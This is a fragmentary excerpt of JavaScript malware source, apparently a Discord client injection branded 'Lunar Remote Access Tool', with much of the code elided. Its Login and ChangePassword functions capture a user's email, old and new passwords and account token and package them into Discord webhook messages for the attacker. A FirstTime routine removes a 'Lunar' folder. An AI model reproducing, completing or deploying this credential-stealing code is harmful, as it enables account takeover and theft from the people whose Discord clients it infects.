...
function FirstTime() {
    ...
    fs.rmdirSync(path.join(__dirname, "Lunar"));
...
function Login(email, password, token) {
    ...
    xmlHttp.responseText;`, !0).then((info) => {
        ...
        var params = {
            username: "• Lunar Injection ",
            content: "",
            avatar_url: "https://cdn.discordapp.com/attachments/936195539685490728/936198209330610237/images.png",
            embeds: [
                {
                    "color": 0x820aea,
                    "fields": [
                    ...
                    "footer": {
                        "text": "• Lunar Remote Access Tool maded with Love ❌ code ✅"
                    }
                }
            ]
        }
...
function ChangePassword(oldpassword, newpassword, token) {
    ...
    xmlHttp.responseText;`, !0).then((info) => {
        const json = JSON.parse(info);
        var params = {
            username: "• Lunar Remote Access Tool",
            content: "",
            avatar_url: "https://cdn.discordapp.com/attachments/936195539685490728/936198209330610237/images.png",
            embeds: [
                {
